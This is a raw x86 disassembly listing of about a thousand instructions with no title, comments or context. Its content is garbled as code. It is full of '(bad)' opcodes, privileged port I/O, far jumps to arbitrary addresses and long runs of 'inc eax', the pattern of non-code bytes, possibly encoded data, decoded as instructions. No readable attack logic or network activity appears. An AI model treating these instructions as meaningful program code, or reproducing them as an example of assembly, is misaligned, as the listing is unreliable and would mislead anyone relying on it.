  40a5eb:	(bad)  
  40a5ec:	fs test al,0x9d
  40a5ef:	xor    al,0x15
  40a5f1:	inc    esp
  40a5f2:	int    0x44
  40a5f4:	rcl    BYTE PTR [edx-0x55],0xcb
  40a5f8:	enter  0xc31d,0x2c
  40a5fc:	add    al,0xde
  40a5fe:	inc    esp
  40a5ff:	inc    eax
  40a600:	add    cl,al
  40a602:	inc    eax
  40a603:	inc    eax
  40a604:	inc    eax
  40a605:	inc    eax
  40a606:	add    BYTE PTR [eax-0x42],al
  40a609:	adc    bl,BYTE PTR [ebx-0x23d81d9a]
  40a60f:	stos   DWORD PTR es:[edi],eax
  40a610:	dec    ebx
  40a611:	(bad)  
  40a612:	adc    al,0xc2
  40a614:	lds    ecx,FWORD PTR [ebp-0x42]
  40a617:	inc    eax
  40a618:	xchg   edx,eax
  40a619:	mov    ss,ebp
  40a61b:	sub    ebp,DWORD PTR [edi+0x64]
  40a61e:	icebp  
  40a61f:	inc    esp
  40a620:	inc    ebx
  40a621:	mov    al,BYTE PTR [ebp+0x22]
  40a624:	(bad)  
  40a625:	pop    esp
  40a626:	fst    DWORD PTR [ecx+0x40]
  40a629:	inc    eax
  40a62a:	inc    eax
  40a62b:	inc    eax
  40a62c:	inc    eax
  40a62d:	inc    eax
  40a62e:	inc    eax
  40a62f:	inc    eax
  40a630:	inc    DWORD PTR [eax-0x14]
  40a633:	test   al,0xd7
  40a635:	pop    ebx
  40a636:	inc    esp
  40a637:	add    ch,dh
  40a639:	and    al,0x4b
  40a63b:	ror    esp,1
  40a63d:	shr    DWORD PTR [eax+eax*2],0x40
  40a641:	inc    eax
  40a642:	inc    eax
  40a643:	inc    eax
  40a644:	inc    eax
  40a645:	inc    eax
  40a646:	inc    eax
  40a647:	inc    eax
  40a648:	inc    eax
  40a649:	retf   
  40a64a:	add    BYTE PTR [edi-0x3c],0x61
  40a64e:	pop    ds
  40a64f:	xor    esp,eax
  40a651:	sub    BYTE PTR [ecx+0x35],0x5c
  40a655:	xchg   esi,eax
  40a656:	push   cs
  40a657:	inc    eax
  40a658:	inc    eax
  40a659:	inc    eax
  40a65a:	inc    eax
  40a65b:	inc    eax
  40a65c:	inc    eax
  40a65d:	inc    eax
  40a65e:	inc    eax
  40a65f:	add    bl,al
  40a661:	aad    0xff
  40a663:	pop    eax
  40a664:	dec    eax
  40a665:	dec    ebx
  40a666:	push   0x62741110
  40a66b:	inc    ebx
  40a66c:	adc    eax,0xc07940c5
  40a671:	out    dx,al
  40a672:	pusha  
  40a673:	fnstsw WORD PTR [ebx+0x47]
  40a676:	inc    eax
  40a677:	inc    eax
  40a678:	aaa    
  40a679:	inc    esp
  40a67a:	pop    ecx
  40a67b:	add    eax,0x77403844
  40a680:	pop    ebx
  40a681:	sub    al,0x40
  40a683:	inc    eax
  40a684:	inc    eax
  40a685:	inc    eax
  40a686:	inc    eax
  40a687:	inc    eax
  40a688:	and    eax,0xdd404040
  40a68d:	test   al,0x11
  40a68f:	mov    DWORD PTR [eax-0x34],0x104bdec0
  40a696:	retf   
  40a697:	pushf  
  40a698:	cmp    eax,0xd0482459
  40a69d:	mov    esp,0xb1ec4b45
  40a6a2:	push   esp
  40a6a3:	popf   
  40a6a4:	cmp    BYTE PTR [ecx-0x64],al
  40a6a7:	out    0x23,al
  40a6a9:	adc    eax,eax
  40a6ab:	inc    esp
  40a6ac:	mov    esi,0xe113f015
  40a6b1:	stc    
  40a6b2:	xor    eax,0x40404040
  40a6b7:	inc    eax
  40a6b8:	inc    eax
  40a6b9:	inc    eax
  40a6ba:	inc    eax
  40a6bb:	inc    eax
  40a6bc:	inc    eax
  40a6bd:	sub    al,0xa8
  40a6bf:	xor    BYTE PTR [edx-0x30],ah
  40a6c2:	enter  0x3511,0xdc
  40a6c6:	inc    edx
  40a6c7:	or     al,0xcc
  40a6c9:	inc    ecx
  40a6ca:	ud0    eax,DWORD PTR [eax-0x3b]
  40a6ce:	xor    ebx,DWORD PTR [eax+0x117f18c0]
  40a6d4:	das    
  40a6d5:	inc    ebp
  40a6d6:	xchg   ecx,eax
  40a6d7:	push   0x401272be
  40a6dc:	inc    eax
  40a6dd:	inc    eax
  40a6de:	inc    eax
  40a6df:	inc    eax
  40a6e0:	inc    eax
  40a6e1:	rol    DWORD PTR [eax+0x40],0xff
  40a6e5:	push   esp
  40a6e6:	(bad)  
  40a6e7:	push   ebp
  40a6e8:	sub    al,0x10
  40a6ea:	ins    BYTE PTR es:[edi],dx
  40a6eb:	aad    0x46
  40a6ed:	ret    0xcd44
  40a6f0:	xor    BYTE PTR [edx+0x4a],ah
  40a6f3:	lods   eax,DWORD PTR ds:[esi]
  40a6f4:	pop    edi
  40a6f5:	sub    ebp,DWORD PTR [ebx+eax*2]
  40a6f8:	jae    0x40a6fc
  40a6fa:	cdq    
  40a6fb:	cmp    DWORD PTR [ebx],edx
  40a6fd:	pop    eax
  40a6fe:	fcmovu st,st(0)
  40a700:	dec    bl
  40a702:	jae    0x40a70e
  40a704:	mov    ch,0xc0
  40a706:	aad    0x6f
  40a708:	sar    DWORD PTR [eax+eax*2+0x40400040],0x40
  40a710:	inc    eax
  40a711:	inc    eax
  40a712:	inc    eax
  40a713:	dec    edx
  40a714:	or     BYTE PTR [edx+0x21],dl
  40a717:	inc    edx
  40a718:	test   al,0x62
  40a71a:	sbb    ecx,ebx
  40a71c:	mov    ah,0xd1
  40a71e:	inc    esp
  40a71f:	fimul  WORD PTR [ecx+0x4015271b]
  40a725:	inc    eax
  40a726:	inc    eax
  40a727:	inc    eax
  40a728:	inc    eax
  40a729:	inc    eax
  40a72a:	inc    eax
  40a72b:	inc    eax
  40a72c:	inc    eax
  40a72d:	inc    eax
  40a72e:	jo     0x40a76e
  40a730:	shr    BYTE PTR [edx],0x6e
  40a733:	sar    BYTE PTR [ebp+esi*1+0x44555153],1
  40a73a:	push   bp
  40a73c:	inc    eax
  40a73d:	inc    eax
  40a73e:	inc    eax
  40a73f:	inc    eax
  40a740:	inc    eax
  40a741:	inc    eax
  40a742:	int3   
  40a743:	jne    0x40a785
  40a745:	dec    edx
  40a746:	inc    edx
  40a747:	cmp    eax,DWORD PTR [eax+0x60]
  40a74a:	sub    eax,0x4cc1a84b
  40a74f:	xchg   esp,eax
  40a750:	mov    cl,0x55
  40a752:	fcomp  DWORD PTR [eax+0x403d4bbb]
  40a758:	add    cl,al
  40a75a:	inc    eax
  40a75b:	inc    eax
  40a75c:	inc    eax
  40a75d:	inc    eax
  40a75e:	add    BYTE PTR [eax+0x46],al
  40a761:	mov    edi,0xd24ccdc4
  40a766:	and    bl,al
  40a768:	cmp    DWORD PTR [ebx],edi
  40a76a:	and    dl,bh
  40a76c:	test   BYTE PTR [ecx+eiz*8+0x1b],ah
  40a770:	and    BYTE PTR [esi+0x5b],dh
  40a773:	xchg   esi,eax
  40a774:	ret    
  40a775:	and    al,0x72
  40a777:	inc    esp
  40a778:	pop    es
  40a779:	stos   BYTE PTR es:[edi],al
  40a77a:	shl    BYTE PTR [esi+edi*1-0x18],0x9a
  40a77f:	inc    ebx
  40a780:	aad    0x5a
  40a782:	outs   dx,BYTE PTR ds:[esi]
  40a783:	inc    esp
  40a784:	jg     0x40a7e9
  40a786:	fiadd  DWORD PTR [eax+0x40]
  40a789:	inc    eax
  40a78a:	inc    eax
  40a78b:	inc    eax
  40a78c:	inc    eax
  40a78d:	inc    eax
  40a78e:	inc    eax
  40a78f:	inc    DWORD PTR [eax+0x28]
  40a792:	cmp    BYTE PTR [ecx],dh
  40a794:	push   ebx
  40a795:	sub    al,0x63
  40a797:	pop    ecx
  40a798:	push   ecx
  40a799:	push   eax
  40a79a:	aaa    
  40a79b:	pop    esi
  40a79c:	ret    0x7cd6
  40a79f:	sub    BYTE PTR [ebx+eax*2-0x3ac2cee3],cl
  40a7a6:	enter  0x49ce,0x29
  40a7aa:	inc    BYTE PTR [esp+ecx*2]
  40a7ad:	pop    esp
  40a7ae:	inc    edi
  40a7af:	cmp    ch,BYTE PTR [ecx-0x34]
  40a7b2:	xchg   esp,eax
  40a7b3:	repnz ror dh,0x3a
  40a7b7:	adc    eax,DWORD PTR [eax+0x40]
  40a7ba:	inc    eax
  40a7bb:	inc    eax
  40a7bc:	inc    eax
  40a7bd:	inc    eax
  40a7be:	inc    eax
  40a7bf:	inc    eax
  40a7c0:	inc    eax
  40a7c1:	inc    eax
  40a7c2:	std    
  40a7c3:	sbb    ecx,eax
  40a7c5:	sub    DWORD PTR ds:0x2f840e0f,edx
  40a7cb:	inc    ebx
  40a7cc:	inc    esi
  40a7cd:	add    edi,DWORD PTR [ebx+0x44]
  40a7d0:	test   al,0x1a
  40a7d2:	mov    esp,0x404040ca
  40a7d7:	inc    eax
  40a7d8:	inc    eax
  40a7d9:	inc    eax
  40a7da:	inc    eax
  40a7db:	inc    eax
  40a7dc:	add    bh,cl
  40a7de:	ror    DWORD PTR [eax],cl
  40a7e0:	sub    eax,0x40630963
  40a7e5:	rcl    DWORD PTR [esi-0x3f],cl
  40a7e8:	aam    0x82
  40a7ea:	adc    eax,0x57402a42
  40a7ef:	pmullw mm4,QWORD PTR [edx+0x65]
  40a7f3:	xor    al,0x43
  40a7f5:	inc    eax
  40a7f6:	sti    
  40a7f7:	ret    0x4547
  40a7fa:	dec    esp
  40a7fb:	imul   esp,DWORD PTR [edx-0x11d8b5c0],0x404040c0
  40a805:	inc    eax
  40a806:	inc    eax
  40a807:	inc    eax
  40a808:	and    eax,0xac404040
  40a80d:	aad    0x59
  40a80f:	inc    eax
  40a810:	xor    BYTE PTR [ecx],al
  40a812:	inc    esp
  40a813:	adc    ch,BYTE PTR [ecx]
  40a815:	dec    eax
  40a816:	stos   DWORD PTR es:[edi],eax
  40a817:	(bad)  [edx]
  40a819:	shr    BYTE PTR [eax+eiz*2],0xf0
  40a81d:	arpl   WORD PTR [ebp+esi*8+0x76d23209],di
  40a824:	cmp    al,0x70
  40a826:	add    eax,0xcd411180
  40a82b:	(bad)  
  40a82c:	push   0xffffffe0
  40a82e:	leave  
  40a82f:	out    0x52,eax
  40a831:	rol    BYTE PTR [eax+0x40],0x40
  40a835:	inc    eax
  40a836:	inc    eax
  40a837:	inc    eax
  40a838:	inc    eax
  40a839:	inc    eax
  40a83a:	inc    eax
  40a83b:	inc    eax
  40a83c:	or     cl,BYTE PTR [eax]
  40a83e:	adc    edi,esi
  40a840:	pop    eax
  40a841:	inc    edi
  40a842:	xchg   ecx,eax
  40a843:	sub    al,0xfe
  40a845:	jmp    0xcb84a126
  40a84a:	sbb    BYTE PTR [edx],ch
  40a84c:	inc    esp
  40a84d:	mov    ebp,0x3e436294
  40a852:	sbb    bl,BYTE PTR [esp+ebp*1+0x6e]
  40a856:	mov    WORD PTR [eax],cs
  40a858:	xor    BYTE PTR [ecx+0x41],cl
  40a85b:	rol    BYTE PTR [eax+0x40],0x40
  40a85f:	inc    eax
  40a860:	inc    eax
  40a861:	inc    eax
  40a862:	rol    DWORD PTR [eax+0x40],0xd0
  40a866:	in     al,dx
  40a867:	inc    ebp
  40a868:	ror    al,0xe3
  40a86b:	jg     0x40a890
  40a86d:	lds    edi,FWORD PTR [edi]
  40a86f:	pop    eax
  40a870:	and    eax,0x400a7d76
  40a875:	inc    eax
  40a876:	add    BYTE PTR [eax+0x40],al
  40a879:	inc    eax
  40a87a:	inc    eax
  40a87b:	inc    eax
  40a87c:	inc    eax
  40a87d:	inc    ecx
  40a87e:	pusha  
  40a87f:	test   al,0xcb
  40a881:	push   ecx
  40a882:	test   al,0x48
  40a884:	pop    ds
  40a885:	sar    dh,0x10
  40a888:	inc    esi
  40a889:	enter  0x2a99,0xd4
  40a88d:	cmp    eax,DWORD PTR [esp+edx*2-0x13]
  40a891:	push   edx
  40a892:	daa    
  40a893:	mov    edi,0x802c78ff
  40a898:	xor    ch,BYTE PTR [ebx-0x3f009cef]
  40a89e:	into   
  40a89f:	ret    
  40a8a0:	adc    BYTE PTR [edx-0x20],al
  40a8a3:	imul   eax,DWORD PTR [eax+0x40],0x40
  40a8a7:	inc    eax
  40a8a8:	inc    eax
  40a8a9:	inc    eax
  40a8aa:	inc    eax
  40a8ab:	inc    eax
  40a8ac:	inc    eax
  40a8ad:	inc    eax
  40a8ae:	outs   dx,BYTE PTR ds:[esi]
  40a8af:	and    DWORD PTR [esp+eax*2+0x710d34e9],edx
  40a8b6:	stos   DWORD PTR es:[edi],eax
  40a8b7:	dec    eax
  40a8b8:	test   DWORD PTR [ebx+eiz*2+0x40],eax
  40a8bc:	int    0x32
  40a8be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8bf:	enter  0x5a44,0xd1
  40a8c3:	push   eax
  40a8c4:	adc    BYTE PTR [esi+ebp*2+0x18242c39],dl
  40a8cb:	cmp    dl,BYTE PTR [eax+eax*8-0x5d]
  40a8cf:	jmp    0x4040:0x4065ffcc
  40a8d6:	inc    eax
  40a8d7:	inc    eax
  40a8d8:	inc    eax
  40a8d9:	int3   
  40a8da:	jne    0x40a91c
  40a8dc:	ret    
  40a8dd:	add    eax,0x4d4737f3
  40a8e2:	cmp    ecx,DWORD PTR [edx-0x48]
  40a8e5:	retf   
  40a8e6:	bound  esp,QWORD PTR [ecx-0x36577240]
  40a8ec:	adc    eax,0x33240c12
  40a8f1:	inc    esp
  40a8f2:	inc    eax
  40a8f3:	dec    eax
  40a8f4:	inc    esi
  40a8f5:	pop    eax
  40a8f6:	xchg   ebx,eax
  40a8f7:	loope  0x40a953
  40a8f9:	sub    al,0x40
  40a8fb:	add    cl,al
  40a8fd:	inc    eax
  40a8fe:	inc    eax
  40a8ff:	inc    eax
  40a900:	inc    eax
  40a901:	add    BYTE PTR [eax+0x1],al
  40a904:	inc    edx
  40a905:	pop    ds
  40a906:	adc    eax,0xcac3ade8
  40a90b:	enter  0xbc23,0xcb
  40a90f:	and    dh,BYTE PTR [edi+0x51]
  40a912:	vsubps xmm4,xmm6,XMMWORD PTR [edx+0x11]
  40a917:	push   0x4040ca9b
  40a91c:	inc    eax
  40a91d:	inc    eax
  40a91e:	inc    eax
  40a91f:	inc    eax
  40a920:	inc    eax
  40a921:	inc    eax
  40a922:	inc    DWORD PTR [eax+0x45]
  40a925:	sub    BYTE PTR ds:0xe5cc4250,dl
  40a92b:	outs   dx,DWORD PTR ds:[esi]
  40a92c:	inc    BYTE PTR [ebp-0x26]
  40a92f:	or     BYTE PTR [eax-0x5],al
  40a932:	and    edx,DWORD PTR [eax+0x44]
  40a935:	inc    eax
  40a936:	fmulp  st(3),st
  40a938:	or     al,0x7f
  40a93a:	xor    eax,0x63dc2cc0
  40a93f:	mov    eax,0x2c3fb7cd
  40a944:	enter  0x4069,0x40
  40a948:	inc    eax
  40a949:	inc    eax
  40a94a:	inc    eax
  40a94b:	inc    eax
  40a94c:	inc    eax
  40a94d:	inc    eax
  40a94e:	inc    eax
  40a94f:	inc    eax
  40a950:	inc    ebp
  40a951:	inc    ecx
  40a952:	dec    esi
  40a953:	(bad)  
  40a954:	addr16 dec edx
  40a956:	aad    0xcd
  40a958:	xor    BYTE PTR [esi+eax*8],ch
  40a95b:	adc    DWORD PTR [edx+0x444447c0],esp
  40a961:	xor    al,0xc0
  40a963:	out    0x74,al
  40a965:	cmc    
  40a966:	out    dx,al
  40a967:	mov    ebp,0x62cdb84a
  40a96c:	push   eax
  40a96d:	and    DWORD PTR [eax+eax*2+0x40],eax
  40a971:	inc    eax
  40a972:	inc    eax
  40a973:	inc    eax
  40a974:	inc    eax
  40a975:	inc    eax
  40a976:	inc    eax
  40a977:	add    BYTE PTR [eax],bl
  40a979:	lds    edx,FWORD PTR ds:0x40ad53c3
  40a97f:	sub    al,0x4d
  40a981:	pop    eax
  40a982:	leave  
  40a983:	test   al,0xca
  40a985:	dec    esi
  40a986:	pop    ss
  40a987:	(bad)  
  40a988:	mov    ecx,0xf9105245
  40a98d:	test   eax,0x40404006
  40a992:	inc    eax
  40a993:	inc    eax
  40a994:	inc    eax
  40a995:	and    eax,0xcd404040
  40a99a:	pop    ebp
  40a99b:	xor    DWORD PTR [ebx],ebp
  40a99d:	pop    eax
  40a99e:	pop    edx
  40a99f:	dec    edi
  40a9a0:	rol    BYTE PTR [ecx+0x35],0x2c
  40a9a4:	push   ebp
  40a9a5:	add    eax,0xee34231f
  40a9aa:	inc    ecx
  40a9ab:	and    al,0xcb
  40a9ad:	retf   
  40a9ae:	cmp    bh,al
  40a9b0:	das    
  40a9b1:	inc    esp
  40a9b2:	push   esp
  40a9b3:	push   ebp
  40a9b4:	dec    esp
  40a9b5:	inc    ecx
  40a9b6:	pop    ebp
  40a9b7:	popa   
  40a9b8:	rol    BYTE PTR [eax+0x40],0x40
  40a9bc:	inc    eax
  40a9bd:	inc    eax
  40a9be:	inc    eax
  40a9bf:	inc    eax
  40a9c0:	inc    eax
  40a9c1:	inc    eax
  40a9c2:	inc    eax
  40a9c3:	sub    al,0x39
  40a9c5:	fmul   DWORD PTR [eax]
  40a9c7:	sub    dh,BYTE PTR [eax+0x42c439df]
  40a9cd:	or     cl,0x70
  40a9d0:	popa   
  40a9d1:	cmc    
  40a9d2:	inc    eax
  40a9d3:	dec    ebp
  40a9d4:	stos   BYTE PTR es:[edi],al
  40a9d5:	out    0x54,al
  40a9d7:	inc    edi
  40a9d8:	inc    eax
  40a9d9:	inc    eax
  40a9da:	inc    eax
  40a9db:	inc    eax
  40a9dc:	inc    eax
  40a9dd:	inc    eax
  40a9de:	rol    DWORD PTR [eax+0x40],0xf7
  40a9e2:	add    eax,0xa8208d54
  40a9e7:	inc    ebx
  40a9e8:	cmp    bl,BYTE PTR [eax+0x62443221]
  40a9ee:	adc    DWORD PTR [edx+0x40],edi
  40a9f1:	inc    eax
  40a9f2:	add    BYTE PTR [eax+0x40],al
  40a9f5:	inc    eax
  40a9f6:	inc    eax
  40a9f7:	inc    eax
  40a9f8:	inc    eax
  40a9f9:	int3   
  40a9fa:	and    bh,bh
  40a9fc:	pop    eax
  40a9fd:	sub    al,0x66
  40a9ff:	inc    ecx
  40aa00:	rcl    BYTE PTR [ecx],1
  40aa02:	push   esi
  40aa03:	and    al,al
  40aa05:	ret    0x9dab
  40aa08:	dec    eax
  40aa09:	xor    eax,0xd57e6c49
  40aa0e:	inc    eax
  40aa0f:	aam    0x11
  40aa11:	inc    ecx
  40aa12:	mov    ch,0x67
  40aa14:	jns    0x40aa5d
  40aa16:	(bad)  
  40aa17:	(bad)  
  40aa18:	enter  0xc34c,0x43
  40aa1c:	inc    eax
  40aa1d:	out    dx,al
  40aa1e:	inc    eax
  40aa1f:	inc    eax
  40aa20:	inc    eax
  40aa21:	inc    eax
  40aa22:	inc    eax
  40aa23:	inc    eax
  40aa24:	inc    eax
  40aa25:	inc    eax
  40aa26:	inc    eax
  40aa27:	inc    eax
  40aa28:	imul   ebp,DWORD PTR [ebx+0x216e3d50],0x42f5442c
  40aa32:	adc    eax,0x1357f4c3
  40aa37:	sub    al,0x1b
  40aa39:	leave  
  40aa3a:	retf   0x1de
  40aa3d:	bound  eax,QWORD PTR [ecx-0x40]
  40aa40:	stc    
  40aa41:	inc    eax
  40aa42:	inc    eax
  40aa43:	inc    eax
  40aa44:	inc    eax
  40aa45:	inc    eax
  40aa46:	inc    eax
  40aa47:	int3   
  40aa48:	jne    0x40aa8a
  40aa4a:	mov    ah,0x43
  40aa4c:	inc    esp
  40aa4d:	pop    es
  40aa4e:	daa    
  40aa4f:	dec    ebp
  40aa50:	int    0x62
  40aa52:	inc    ecx
  40aa53:	fsub   st(1),st
  40aa55:	sub    ecx,DWORD PTR [edx+0x40]
  40aa58:	leave  
  40aa59:	dec    eax
  40aa5a:	stc    
  40aa5b:	sub    ah,bl
  40aa5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa5e:	popa   
  40aa5f:	inc    eax
  40aa60:	add    cl,al
  40aa62:	inc    eax
  40aa63:	inc    eax
  40aa64:	inc    eax
  40aa65:	inc    eax
  40aa66:	add    BYTE PTR [eax+0x7c],al
  40aa69:	cmp    BYTE PTR es:[eax+0x2],bh
  40aa6d:	arpl   si,dx
  40aa6f:	add    BYTE PTR [esi],dl
  40aa71:	inc    ecx
  40aa72:	xor    al,0x62
  40aa74:	pop    esp
  40aa75:	fmul   QWORD PTR [eax+0x21]
  40aa78:	xchg   ebx,eax
  40aa79:	xchg   BYTE PTR [ecx-0x35],al
  40aa7c:	sub    DWORD PTR [ebx],edx
  40aa7e:	push   esi
  40aa7f:	pop    ecx
  40aa80:	inc    edx
  40aa81:	rcr    BYTE PTR [ecx+0x4a],1
  40aa84:	clc    
  40aa85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa86:	pop    esp
  40aa87:	arpl   WORD PTR [esi+0x62],di
  40aa8a:	push   0x4eda9434
  40aa8f:	inc    eax
  40aa90:	inc    eax
  40aa91:	inc    eax
  40aa92:	inc    eax
  40aa93:	inc    eax
  40aa94:	inc    eax
  40aa95:	inc    eax
  40aa96:	inc    eax
  40aa97:	inc    DWORD PTR [eax-0x9]
  40aa9a:	test   DWORD PTR [edx+eax*2-0x7],0x4f940562
  40aaa2:	inc    eax
  40aaa3:	sub    al,0x54
  40aaa5:	xor    esp,edi
  40aaa7:	jno    0x40aa4b
  40aaa9:	mov    eax,ds:0x4a393e2d
  40aaae:	and    al,0xe2
  40aab0:	add    dl,BYTE PTR [ecx]
  40aab2:	inc    eax
  40aab3:	inc    eax
  40aab4:	inc    eax
  40aab5:	inc    eax
  40aab6:	inc    eax
  40aab7:	inc    eax
  40aab8:	inc    eax
  40aab9:	inc    eax
  40aaba:	inc    eax
  40aabb:	inc    eax
  40aabc:	inc    eax
  40aabd:	(bad)
  40aac0:	cmc    
  40aac1:	clc    
  40aac2:	dec    ebx
  40aac3:	in     eax,0x34
  40aac5:	mov    DWORD PTR [ecx+0x48],eax
  40aac8:	fcom   DWORD PTR fs:[ebx]
  40aacb:	or     al,0xeb
  40aacd:	neg    BYTE PTR [ebx]
  40aacf:	or     BYTE PTR [edx+0x46],ah
  40aad2:	lds    esp,FWORD PTR [ecx-0x349fbbc0]
  40aad8:	imul   esi,DWORD PTR [esi+0x2c7c948a],0x40b8bc62
  40aae2:	inc    eax
  40aae3:	inc    eax
  40aae4:	inc    eax
  40aae5:	inc    eax
  40aae6:	inc    eax
  40aae7:	inc    eax
  40aae8:	inc    eax
  40aae9:	add    dh,dl
  40aaeb:	mov    ds:0x443ce2e1,eax
  40aaf0:	inc    ebx
  40aaf1:	dec    ebp
  40aaf2:	or     eax,0x4dbe4fa7
  40aaf7:	shr    BYTE PTR [edx],0xec
  40aafa:	adc    al,0xc5
  40aafc:	mov    ds:0x40404040,al
  40ab01:	inc    eax
  40ab02:	inc    eax
  40ab03:	and    eax,0xbf404040
  40ab08:	(bad)  
  40ab09:	sar    BYTE PTR [eax+0x9dbca42],0x40
  40ab10:	inc    esp
  40ab11:	inc    esp
  40ab12:	push   ebx
  40ab13:	test   al,0xf
  40ab15:	inc    eax
  40ab16:	retf   0x2c40
  40ab19:	and    DWORD PTR [ebx+0x54],ecx
  40ab1c:	stc    
  40ab1d:	pusha  
  40ab1e:	and    DWORD PTR [ebp+0x3a],ebx
  40ab21:	fwait
  40ab22:	xor    al,0x2a
  40ab24:	inc    eax
  40ab25:	inc    eax
  40ab26:	inc    eax
  40ab27:	inc    eax
  40ab28:	inc    eax
  40ab29:	inc    eax
  40ab2a:	inc    eax
  40ab2b:	inc    eax
  40ab2c:	inc    eax
  40ab2d:	inc    eax
  40ab2e:	aam    0x40
  40ab30:	push   esi
  40ab31:	mov    ah,0xcd
  40ab33:	test   al,0x40
  40ab35:	and    eax,0x71b34005
  40ab3a:	inc    edx
  40ab3b:	adc    al,BYTE PTR [eax+0x40]
  40ab3e:	inc    eax
  40ab3f:	inc    eax
  40ab40:	inc    eax
  40ab41:	inc    eax
  40ab42:	rol    DWORD PTR [eax+0x40],0x54
  40ab46:	inc    edx
  40ab47:	inc    ecx
  40ab48:	inc    eax
  40ab49:	mov    ebx,0x41c4fe90
  40ab4e:	dec    edx
  40ab4f:	dec    esi
  40ab50:	push   eax
  40ab51:	mov    BYTE PTR [eax+0x44],0x2f
  40ab55:	cmp    DWORD PTR [esp+eax*4+0x2c24a140],ebp
  40ab5c:	bound  ebp,QWORD PTR [ecx+esi*1-0x2e]
  40ab60:	inc    eax
  40ab61:	or     BYTE PTR [eax+0x40],al
  40ab64:	add    BYTE PTR [eax+0x40],al
  40ab67:	inc    eax
  40ab68:	inc    eax
  40ab69:	inc    eax
  40ab6a:	inc    eax
  40ab6b:	retf   0x5838
  40ab6e:	bound  ebp,QWORD PTR [ebx+0x40a34015]
  40ab74:	dec    eax
  40ab75:	imul   esi,DWORD PTR [eax-0x4c],0x40404040
  40ab7c:	inc    eax
  40ab7d:	inc    eax
  40ab7e:	inc    eax
  40ab7f:	inc    eax
  40ab80:	inc    eax
  40ab81:	inc    eax
  40ab82:	push   ebx
  40ab83:	push   eax
  40ab84:	inc    esp
  40ab85:	gs popf 
  40ab87:	int    0x37
  40ab89:	add    eax,0x85a140e2
  40ab8e:	inc    esp
  40ab8f:	inc    ebx
  40ab90:	or     ebx,0x400b40fa
  40ab96:	sub    al,0xb8
  40ab98:	bound  eax,QWORD PTR [ebp+0x40]
  40ab9b:	inc    eax
  40ab9c:	inc    eax
  40ab9d:	inc    eax
  40ab9e:	inc    eax
  40ab9f:	inc    eax
  40aba0:	int3   
  40aba1:	jne    0x40abe3
  40aba3:	rol    BYTE PTR [eax+0x61],1
  40aba6:	add    al,0x36
  40aba8:	stos   DWORD PTR es:[edi],eax
  40aba9:	adc    eax,DWORD PTR [ebx+0xd]
  40abac:	adc    BYTE PTR [eax+0x40],cl
  40abaf:	aad    0x92
  40abb1:	xlat   BYTE PTR ds:[ebx]
  40abb2:	inc    edx
  40abb3:	loopne 0x40abf5
  40abb5:	mov    ds:0xbd6a500f,al
  40abba:	mov    al,ds:0x482940e3
  40abbf:	out    dx,al
  40abc0:	bound  eax,QWORD PTR ds:[eax+0x0]
  40abc4:	rol    DWORD PTR [eax+0x40],0x40
  40abc8:	inc    eax
  40abc9:	add    BYTE PTR [eax+0x69],al
  40abcc:	stc    
  40abcd:	inc    eax
  40abce:	mov    cl,ch
  40abd0:	inc    esp
  40abd1:	cmp    al,0xc2
  40abd3:	and    esi,ecx
  40abd5:	adc    cl,ah
  40abd7:	inc    eax
  40abd8:	sub    al,0x40
  40abda:	inc    eax
  40abdb:	inc    eax
  40abdc:	inc    eax
  40abdd:	inc    eax
  40abde:	inc    eax
  40abdf:	inc    eax
  40abe0:	inc    eax
  40abe1:	inc    DWORD PTR [eax+0x1f]
  40abe4:	and    BYTE PTR [eax+0x65484019],dl
  40abea:	xor    al,0x3d
  40abec:	or     BYTE PTR [esi+edi*4+0x40],0xe2
  40abf1:	push   ecx
  40abf2:	int    0x4c
  40abf4:	ret    
  40abf5:	addr16 int3 
  40abf7:	inc    ecx
  40abf8:	mov    ebx,0x21bc4a40
  40abfd:	mov    ebp,0x7a67d07b
  40ac02:	out    dx,al
  40ac03:	test   al,0x6
  40ac05:	dec    ecx
  40ac06:	mov    cl,0x40
  40ac08:	inc    ebx
  40ac09:	inc    eax
  40ac0a:	inc    eax
  40ac0b:	inc    eax
  40ac0c:	inc    eax
  40ac0d:	inc    eax
  40ac0e:	inc    eax
  40ac0f:	inc    eax
  40ac10:	inc    eax
  40ac11:	inc    eax
  40ac12:	inc    eax
  40ac13:	inc    eax
  40ac14:	dec    eax
  40ac15:	adc    DWORD PTR [edx-0x50],esp
  40ac18:	retf   0xa540
  40ac1b:	imul   edi,DWORD PTR [esp+edi*4],0x400db348
  40ac22:	stc    
  40ac23:	xor    esi,DWORD PTR [edx]
  40ac25:	inc    edx
  40ac26:	or     BYTE PTR [eax+0x62],dl
  40ac29:	inc    eax
  40ac2a:	loope  0x40ac6e
  40ac2c:	lds    esp,FWORD PTR [esi+0x408264a0]
  40ac32:	dec    ecx
  40ac33:	cs inc eax
  40ac35:	inc    eax
  40ac36:	inc    eax
  40ac37:	inc    eax
  40ac38:	inc    eax
  40ac39:	inc    eax
  40ac3a:	inc    eax
  40ac3b:	inc    eax
  40ac3c:	add    dh,bl
  40ac3e:	pop    esp
  40ac3f:	ss daa 
  40ac41:	enter  0xe1d1,0xe2
  40ac45:	mov    fs,WORD PTR [edx+0x2a]
  40ac48:	add    al,0xe5
  40ac4a:	inc    eax
  40ac4b:	dec    ecx
  40ac4c:	inc    ecx
  40ac4d:	fs enter 0x6434,0xd
  40ac52:	inc    eax
  40ac53:	and    DWORD PTR [eax+0x44],eax
  40ac56:	fs and eax,ecx
  40ac59:	inc    ax
  40ac5b:	inc    esi
  40ac5c:	inc    eax
  40ac5d:	inc    eax
  40ac5e:	inc    eax
  40ac5f:	inc    eax
  40ac60:	inc    eax
  40ac61:	inc    eax
  40ac62:	and    eax,0x26404040
  40ac67:	sub    al,0x28
  40ac69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac6a:	fadd   st,st(6)
  40ac6c:	aas    
  40ac6d:	mov    ds:0x63bf30cb,eax
  40ac72:	bound  ebx,QWORD PTR [ecx]
  40ac74:	inc    eax
  40ac75:	inc    edx
  40ac76:	inc    eax
  40ac77:	aad    0x2a
  40ac79:	dec    ebx
  40ac7a:	sub    BYTE PTR [ebp+0x4e60e140],bh
  40ac80:	loopne 0x40ac32
  40ac82:	xor    ah,al
  40ac84:	inc    eax
  40ac85:	inc    eax
  40ac86:	inc    eax
  40ac87:	inc    eax
  40ac88:	inc    eax
  40ac89:	inc    eax
  40ac8a:	inc    eax
  40ac8b:	inc    eax
  40ac8c:	inc    eax
